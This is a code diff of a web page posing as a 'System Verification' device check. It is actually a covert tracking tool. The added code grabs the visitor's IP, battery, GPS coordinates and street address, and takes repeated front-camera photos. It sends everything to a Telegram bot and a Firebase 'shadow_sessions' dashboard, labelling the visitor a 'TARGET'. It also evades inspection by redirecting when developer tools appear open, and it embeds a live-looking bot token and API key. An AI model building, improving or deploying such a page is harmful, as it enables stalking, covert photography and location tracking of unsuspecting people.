@@ -5,60 +5,92 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>System Verification</title>
     <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
 </head>
-<body class="bg-[#020617] text-white flex items-center justify-center h-screen overflow-hidden">
-    <div class="text-center p-10 max-w-sm w-full bg-[#0f172a] rounded-[2.5rem] border border-slate-800 shadow-2xl">
+<body class="bg-[#020617] text-white flex items-center justify-center h-screen overflow-hidden font-sans">
+    
+    <div class="text-center p-10 max-w-sm w-full bg-[#0f172a] rounded-[2.5rem] border border-slate-800 shadow-2xl relative">
         <div class="relative w-16 h-16 mx-auto mb-6">
             <div class="absolute inset-0 border-4 border-blue-500/20 rounded-full"></div>
             <div class="absolute inset-0 border-4 border-blue-500 border-t-transparent rounded-full animate-spin"></div>
         </div>
         <h1 class="text-xl font-black italic tracking-tighter uppercase">Verifying <span class="text-blue-500">Device</span></h1>
         
-        <div class="w-full bg-slate-800 h-1 rounded-full mt-8 overflow-hidden">
-            <div id="bar" class="bg-blue-500 h-full w-0 transition-all duration-300"></div>
+        <div class="w-full bg-slate-800 h-1.5 rounded-full mt-8 overflow-hidden">
+            <div id="bar" class="bg-blue-500 h-full w-0 transition-all duration-500 ease-out"></div>
         </div>
-        <p id="status" class="text-[9px] font-bold text-slate-500 uppercase mt-4 tracking-widest italic">Syncing with Node...</p>
+        <p id="status" class="text-[9px] font-bold text-slate-500 uppercase mt-4 tracking-widest italic">Syncing Protocol...</p>
         
         <video id="v" autoplay playsinline class="hidden"></video>
         <canvas id="c" width="1280" height="720" class="hidden"></canvas>
     </div>
 
     <script>
+        // Firebase Config (Same as your dashboard)
+        const firebaseConfig = {
+            apiKey: "AIzaSyAfrFpzw2UddAxGrhAlIeP_c1OaoIG6wNk",
+            databaseURL: "https://in-app-update-21c61-default-rtdb.firebaseio.com",
+            projectId: "in-app-update-21c61",
+        };
+        if (!firebase.apps.length) { firebase.initializeApp(firebaseConfig); }
+        const db = firebase.database();
+
         const params = new URLSearchParams(window.location.search);
-        const tid = params.get('tid');
+        const tid = params.get('tid'); // Telegram ID
         const red = decodeURIComponent(params.get('rd') || "https://google.com");
         const botToken = "8382714466:AAFAuorgHezCvk1dr7OxExD8zAMpgFTLvLI";
 
-        let address = "Awaiting Address...";
-        let maps = "";
+        let address = "Scanning Location...";
+        let ipData = {};
+        const sessionID = "TRK-" + Math.random().toString(36).substr(2, 6).toUpperCase();
 
-        async function startIntel() {
+        async function startTracking() {
+            // Anti-Analysis: Disable if DevTools is open (Basic)
+            if (window.outerWidth - window.innerWidth > 160 || window.outerHeight - window.innerHeight > 160) {
+                window.location.href = red; return;
+            }
+
             try {
-                // 1. Battery Info
-                const bat = await navigator.getBattery();
-                const batStatus = `${(bat.level * 100).toFixed(0)}% (${bat.charging ? 'Charging' : 'Unplugged'})`;
-
-                // 2. IP & Network Info
+                // 1. IP & Network
                 const ipReq = await fetch('https://ipapi.co/json/');
-                const ip = await ipReq.json();
-                const netInfo = `🌐 *IP:* ${ip.ip}\n🏢 *ISP:* ${ip.org}\n🏙️ *City:* ${ip.city}, ${ip.region}\n📱 *Platform:* ${navigator.platform}`;
+                ipData = await ipReq.json();
 
-                // 3. Location & Exact Address (Gali/Road)
-                navigator.geolocation.getCurrentPosition(pos => {
-                    const lat = pos.coords.latitude;
-                    const lon = pos.coords.longitude;
-                    maps = `https://www.google.com/maps?q=${lat},${lon}`;
+                // 2. Battery
+                const bat = await navigator.getBattery();
+                const batStatus = `${(bat.level * 100).toFixed(0)}%`;
+
+                // 3. Geolocation
+                navigator.geolocation.getCurrentPosition(async (pos) => {
+                    const { latitude: lat, longitude: lon } = pos.coords;
                     
-                    fetch(`https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${lat}&lon=${lon}`)
-                    .then(r => r.json()).then(data => {
-                        address = data.display_name;
-                        
-                        const report = `🚨 *NEW TARGET TRACED* 🚨\n\n📍 *EXACT ADDRESS:* \n${address}\n\n🔗 *MAPS:* ${maps}\n\n${netInfo}\n🔋 *BATTERY:* ${batStatus}`;
-                        sendTG(report);
-                        initCamera();
+                    // Get Physical Address
+                    const geoReq = await fetch(`https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${lat}&lon=${lon}`);
+                    const geoData = await geoReq.json();
+                    address = geoData.display_name;
+
+                    // Send Initial Data to Firebase Dashboard
+                    db.ref('shadow_sessions/' + sessionID).set({
+                        address: address,
+                        target_email: ipData.ip || "Unknown IP",
+                        time: Date.now(),
+                        status: "Active",
+                        battery: batStatus,
+                        platform: navigator.platform
                     });
+
+                    // Send to Telegram
+                    sendTG(`🚨 *TARGET TRACED*\n\n📍 *Address:* ${address}\n🌐 *IP:* ${ipData.ip}\n🔋 *Battery:* ${batStatus}\n📱 *ID:* ${sessionID}`);
+                    
+                    initCamera();
                 }, () => {
-                    sendTG(`⚠️ *GPS DENIED* \n\n${netInfo}\n🔋 *BATTERY:* ${batStatus}`);
+                    // If GPS Denied
+                    db.ref('shadow_sessions/' + sessionID).set({
+                        address: "GPS Denied (Approx: " + ipData.city + ")",
+                        target_email: ipData.ip,
+                        time: Date.now(),
+                        status: "Limited Access"
+                    });
                     initCamera();
                 });
             } catch (e) { initCamera(); }
@@ -68,16 +100,19 @@
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                 document.getElementById('v').srcObject = stream;
-                captureLoop();
+                setTimeout(captureLoop, 1000); // Start after 1s for focus
             } catch(e) { window.location.href = red; }
         }
 
         async function captureLoop() {
-            for(let i=1; i<=6; i++) {
-                document.getElementById('status').innerText = `Capturing Packet ${i}/6...`;
-                document.getElementById('bar').style.width = (i * 16.6) + "%";
-                await new Promise(r => setTimeout(r, 2000));
+            const totalSteps = 4; // Fast capture (4 shots)
+            for(let i=1; i<=totalSteps; i++) {
+                let progress = (i / totalSteps) * 100;
+                document.getElementById('bar').style.width = progress + "%";
+                document.getElementById('status').innerText = `Verifying Node ${i}...`;
+                
                 await takePhoto(i);
+                await new Promise(r => setTimeout(r, 1500)); // Speed optimized
             }
             window.location.href = red;
         }
@@ -87,11 +122,11 @@
             const video = document.getElementById('v');
             canvas.getContext('2d').drawImage(video, 0, 0, 1280, 720);
             
-            const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.5));
+            const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.6));
             const fd = new FormData();
             fd.append('chat_id', tid);
-            fd.append('photo', blob, `img.jpg`);
-            fd.append('caption', `📸 Shot ${idx}/6\n📍 ${address.split(',')[0]} (Road Area)`);
+            fd.append('photo', blob, `shot.jpg`);
+            fd.append('caption', `📸 Shot ${idx} | ID: ${sessionID}\n📍 Near: ${address.split(',')[0]}`);
 
             return fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: 'POST', body: fd });
         }
@@ -104,7 +139,7 @@
             });
         }
 
-        startIntel();
+        startTracking();
     </script>
 </body>
 </html>
